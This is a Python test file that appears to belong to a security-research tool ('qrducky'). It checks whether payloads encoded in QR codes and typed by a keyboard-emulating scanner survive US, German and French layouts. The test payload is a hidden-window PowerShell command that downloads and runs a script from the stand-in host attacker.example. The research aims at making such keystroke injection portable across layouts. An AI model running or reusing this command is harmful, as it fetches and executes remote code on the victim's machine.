"""Layout-safety simulation matrix (W2.2) — the core research evidence.

For every (mode, keystroke-strategy, target-layout) cell, the pipeline is:

    payload bytes -> encoded text -> keystroke stream -> simulated target text
                  -> reference decode -> payload equality

Keystroke strategies:
  * US-naive  — what a US-configured HID scanner (factory default) emits.
                The "unknown target layout" deployment.
  * native    — keystrokes reverse-mapped from the target layout ("known
                target layout", scanner reconfigured accordingly).

Expected results (the research findings these tests pin down):

  mode    | strategy | US | DE | FR
  --------+----------+----+----+-----
  b64     | US-naive | ok | FAIL | FAIL   <- the demonstrated vulnerability
  b64     | native   | ok | ok | ok      <- but requires layout knowledge
  hex     | US-naive | ok | ok | FAIL    <- FR digits need SHIFT
  hex     | native   | ok | ok | ok
  alnum   | US-naive | ok | ok | ok      <- portable with zero target knowledge
"""

import base64
import random

import pytest

from qrducky import (decode, encode, naive_us_keystrokes, native_keystrokes,
                     simulate)

PAYLOAD = b"powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://attacker.example/s'))"  # noqa: E501
BYTES_SEED = random.Random(1337)


def roundtrip(data: bytes, mode: str, layout: str,
              strategy: str) -> tuple[bool, str]:
    """Full simulation pipeline for one matrix cell."""
    enc = encode(data, mode, "US" if strategy == "US-naive" else layout)
    if strategy == "US-naive":
        ks = naive_us_keystrokes(enc.text)
        assert ks is not None
    else:
        ks = native_keystrokes(enc.text, layout)
    typed = simulate(ks, layout)
    if typed != enc.text:
        return False, typed  # text corrupted before decoding
    try:
        return decode(typed, mode) == data, typed
    except ValueError:
        return False, typed


class TestPortableMode:
    """alnum: one US-assumed keystroke stream survives US, DE and FR."""

    @pytest.mark.parametrize("layout", ["US", "DE", "FR"])
    def test_alnum_survives_naive_us_stream(self, layout):
        ok, typed = roundtrip(PAYLOAD, "alnum", layout, "US-naive")
        assert ok, f"alnum corrupted on {layout}: {typed[:40]!r}"

    @pytest.mark.parametrize("layout", ["US", "DE", "FR"])
    def test_alnum_native_stream_survives(self, layout):
        ok, _ = roundtrip(PAYLOAD, "alnum", layout, "native")
        assert ok

    def test_alnum_flags_portable(self):
        assert encode(PAYLOAD, "alnum").portable is True

    def test_alnum_density_matches_hex(self):
        data = BYTES_SEED.randbytes(64)
        enc = encode(data, "alnum")
        # 2 chars/byte + one length-prefix pair -> hex density + 2 chars
        assert len(enc.text) == 2 * (len(data) + 1)
        assert len(enc.text) == len(encode(data, "hex").text) + 2

    def test_alnum_rejects_oversized(self):
        with pytest.raises(Exception):
            encode(b"x" * 400, "alnum")


class TestB64Vulnerability:
    """b64 is the negative control: US-naive streams corrupt on DE and FR."""

    @pytest.mark.parametrize("data,reason", [
        (b"payload with symbols", "punctuated payload"),
        (bytes([0xFE, 0xED, 0xBE, 0xEF] * 5), "high bytes force +/= padding"),
        (b"\xcf\xcf\xcf", "y/z letter swap (QWERTZ)"),
    ])
    def test_b64_fails_de_naive(self, data, reason):
        ok, typed = roundtrip(data, "b64", "DE", "US-naive")
        assert not ok, (reason, typed)

    def test_b64_fails_fr_naive(self):
        ok, typed = roundtrip(PAYLOAD, "b64", "FR", "US-naive")
        assert not ok, f"b64 unexpectedly survived FR: {typed[:40]!r}"

    def test_b64_naive_passes_us(self):
        ok, _ = roundtrip(PAYLOAD, "b64", "US", "US-naive")
        assert ok

    @pytest.mark.parametrize("layout", ["DE", "FR"])
    def test_b64_native_stream_survives(self, layout):
        """Layout knowledge rescues b64: native keystrokes retype it exactly."""
        ok, _ = roundtrip(PAYLOAD, "b64", layout, "native")
        assert ok

    def test_b64_flags_not_portable(self):
        enc = encode(PAYLOAD, "b64")
        assert enc.portable is False
        assert enc.warnings, "b64 must warn about layout assumptions"

    def test_b64_corruption_is_visible(self):
        """Show exactly which characters DE mangles — the classic +=/ story."""
        enc = encode(b"\x00\xfb", "b64", "US")
        typed = simulate(naive_us_keystrokes(enc.text), "DE")
        assert typed != enc.text
        # '=' becomes the ´ dead key, 'z' letter swaps to 'y', etc.
        assert "\u2205" in typed or "(" in typed or "acute(dead)" in typed \
            or "grave(dead)" in typed or "y" in typed


class TestHexMode:
    """hex is US+DE portable with a naive stream; FR needs the native variant."""

    def test_hex_survives_us_naive(self):
        ok, _ = roundtrip(PAYLOAD, "hex", "US", "US-naive")
        assert ok

    def test_hex_survives_de_naive(self):
        ok, _ = roundtrip(PAYLOAD, "hex", "DE", "US-naive")
        assert ok

    def test_hex_fails_fr_naive(self):
        ok, typed = roundtrip(PAYLOAD, "hex", "FR", "US-naive")
        assert not ok, f"hex unexpectedly survived FR naive: {typed[:40]!r}"

    def test_hex_native_survives_fr(self):
        ok, _ = roundtrip(PAYLOAD, "hex", "FR", "native")
        assert ok

    def test_hex_flags_not_portable(self):
        enc = encode(PAYLOAD, "hex", "FR")
        assert enc.portable is False
        assert enc.warnings


class TestRoundTripFidelity:
    """Reference decoders reproduce exact payload bytes for every mode."""

    @pytest.mark.parametrize("mode", ["alnum", "hex", "b64"])
    @pytest.mark.parametrize("data", [
        b"",
        b"A",
        b"hello world",
        bytes(range(256)),
        b"\x00\x01\xff" * 90,
    ], ids=["empty", "one-byte", "text", "all-256", "long-binary"])
    def test_decode_roundtrip(self, mode, data):
        enc = encode(data, mode)
        assert decode(enc.text, mode) == data

    def test_alnum_decode_detects_corruption(self):
        enc = encode(b"AB", "alnum")
        with pytest.raises(ValueError):
            decode(enc.text[:-1], "alnum")  # odd length
        with pytest.raises(ValueError):
            # corrupt the length-prefix pair (65 != 2)
            decode("EF" + enc.text[2:], "alnum")
        with pytest.raises(ValueError):
            decode("BDBDEFQ!", "alnum")  # non-portable chars rejected

    def test_hex_decode_detects_corruption(self):
        with pytest.raises(ValueError):
            decode("GG", "hex")

    def test_b64_decode_rejects_corruption(self):
        with pytest.raises(ValueError):
            decode("aGVsbG8*", "b64")  # non-alphabet char

    def test_encode_rejects_unknown_mode_layout(self):
        from qrducky import EncodeError
        with pytest.raises(EncodeError):
            encode(b"x", "rot13")
        with pytest.raises(EncodeError):
            encode(b"x", "alnum", "ES")


class TestLengthLimits:
    def test_alnum_limit_boundary(self):
        ok, _ = roundtrip(b"x" * 399, "alnum", "FR", "US-naive")
        assert ok
        with pytest.raises(Exception):
            encode(b"x" * 400, "alnum")
